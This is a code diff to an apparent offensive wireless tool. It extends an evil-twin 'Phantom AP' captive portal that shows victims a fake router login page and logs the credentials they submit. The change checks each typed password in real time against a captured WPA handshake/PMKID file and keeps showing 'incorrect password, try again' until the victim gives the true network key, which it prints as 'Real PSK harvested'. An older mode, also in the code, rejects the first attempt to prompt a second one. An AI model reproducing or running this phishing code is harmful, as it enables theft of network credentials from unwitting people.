@@ -136,12 +136,37 @@ class _PortalHandler(http.server.BaseHTTPRequestHandler):
     portal_html: str     = ""
     ssid:        str     = ""
     _submit_count: dict[str, int] = {}  # MAC → attempt count (class-level shared)
+    # When set (from a captured handshake), a submitted password is verified
+    # against the real PSK in real time — see modules/pmkid.make_pmkid_verifier.
+    verify_password: Optional[object] = None
+    verified_password: Optional[str]  = None
 
     def log_message(self, fmt: str, *args: object) -> None:
         logger.debug("portal: " + fmt, *args)
 
     def _client_ip(self) -> str:
         return self.client_address[0]
+
+    @classmethod
+    def _evaluate(cls, passwd: str, attempt_num: int) -> tuple[Optional[bool], bool]:
+        """
+        Decide the portal's response to a submission. Returns
+        ``(verified, show_connecting)``:
+
+          • With a real verifier attached: ``verified`` is True/False from the
+            crypto, and the victim only sees the "connecting" (success) page when
+            the password is *actually correct* — a wrong guess genuinely gets
+            "try again", exactly like the real router.
+          • Without a verifier: legacy social-engineering heuristic — first
+            attempt looks wrong, the second is accepted.
+        """
+        if cls.verify_password is not None:
+            try:
+                verified = bool(passwd) and bool(cls.verify_password(passwd))
+            except Exception:
+                verified = False
+            return verified, verified
+        return None, attempt_num >= 2
 
     def do_GET(self) -> None:
         self.send_response(200)
@@ -163,6 +188,10 @@ class _PortalHandler(http.server.BaseHTTPRequestHandler):
         attempt_num = self.__class__._submit_count.get(attempt_key, 0) + 1
         self.__class__._submit_count[attempt_key] = attempt_num
 
+        verified, show_connecting = self._evaluate(passwd, attempt_num)
+        if verified:
+            self.__class__.verified_password = passwd
+
         entry = {
             "timestamp":  ts,
             "ip":         ip,
@@ -170,28 +199,37 @@ class _PortalHandler(http.server.BaseHTTPRequestHandler):
             "username":   user,
             "password":   passwd,
             "attempt":    attempt_num,
+            "verified":   verified,           # True / False / None (no verifier)
         }
         self.log_file.parent.mkdir(parents=True, exist_ok=True)
         with open(self.log_file, "a") as fh:
             fh.write(json.dumps(entry) + "\n")
 
-        logger.info("phantom: credential captured — ip=%s attempt=%d", ip, attempt_num)
-        console.print(
-            f"  [bold green][PHANTOM][/bold green] Credential from [cyan]{ip}[/cyan]  "
-            f"user=[white]{user}[/white]  attempt={attempt_num}"
-        )
+        logger.info("phantom: credential captured — ip=%s attempt=%d verified=%s",
+                    ip, attempt_num, verified)
+        if verified:
+            console.print(
+                f"  [bold green][PHANTOM ✓ VERIFIED][/bold green] Real PSK harvested "
+                f"from [cyan]{ip}[/cyan]  password=[white]{passwd}[/white]"
+            )
+        else:
+            tag = "rejected" if verified is False else "captured"
+            console.print(
+                f"  [bold green][PHANTOM][/bold green] Credential {tag} from "
+                f"[cyan]{ip}[/cyan]  user=[white]{user}[/white]  attempt={attempt_num}"
+            )
 
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.end_headers()
 
-        if attempt_num < 2:
-            # First attempt: show "wrong password"
+        if show_connecting:
+            # Correct password (or legacy 2nd attempt): show "connecting".
+            self.wfile.write(_build_connecting_html().encode())
+        else:
+            # Wrong / first attempt: show "incorrect password, try again".
             html = self.portal_html.replace('display:none', 'display:block')
             self.wfile.write(html.encode())
-        else:
-            # Second attempt: show "connecting" spinner then let client wait
-            self.wfile.write(_build_connecting_html().encode())
 
 
 # ─── hostapd / dnsmasq orchestration ─────────────────────────────────────────
@@ -295,8 +333,13 @@ def _audit(event: str, bssid: str, personality: int, extra: Optional[dict] = Non
 def phantom_menu(
     interface: str,
     target: Optional[dict],
+    verify_hashfile: Optional[str] = None,
 ) -> None:
-    """Interactive Phantom AP launcher. Called from CLI menu."""
+    """Interactive Phantom AP launcher. Called from CLI menu.
+
+    If *verify_hashfile* points at a captured ``.hc22000`` for the target, the
+    captive portal verifies every submitted password against the real PSK.
+    """
     from .i18n import t
 
     console.print()
@@ -358,6 +401,7 @@ def phantom_menu(
             channel=channel,
             personality=personality,
             vendor=vendor,
+            verify_hashfile=verify_hashfile,
         )
     except KeyboardInterrupt:
         console.print("\n  [yellow]Phantom AP interrupted.[/yellow]")
@@ -375,6 +419,7 @@ def _run_phantom(
     channel: int,
     personality: int,
     vendor: str,
+    verify_hashfile: Optional[str] = None,
 ) -> None:
     """
     Core Phantom AP runner.
@@ -438,10 +483,29 @@ def _run_phantom(
     portal_thread: Optional[threading.Thread] = None
     httpd: Optional[http.server.HTTPServer] = None
 
+    # If the operator already captured a handshake/PMKID for this target, build
+    # a real-time verifier so the portal confirms the true PSK instead of
+    # logging blind guesses.
+    verifier = None
+    if verify_hashfile:
+        try:
+            from modules.pmkid import make_pmkid_verifier
+            verifier = make_pmkid_verifier(verify_hashfile)
+        except Exception as exc:
+            logger.debug("portal verifier unavailable: %s", exc)
+        if verifier:
+            console.print("  [green][+][/green] Live PSK verification "
+                          "[dim](portal confirms the real password)[/dim]")
+        else:
+            console.print("  [yellow][~][/yellow] No PMKID in capture — portal "
+                          "runs in blind-capture mode")
+
     if personality != PERSONALITY_STEALTH:
         class Handler(_PortalHandler):
-            log_file    = log_path
-            portal_html = portal_html  # type: ignore[assignment]
+            log_file        = log_path
+            portal_html     = portal_html  # type: ignore[assignment]
+            verify_password = staticmethod(verifier) if verifier else None
+            verified_password = None
 
         try:
             httpd = http.server.HTTPServer(("", PORTAL_PORT), Handler)
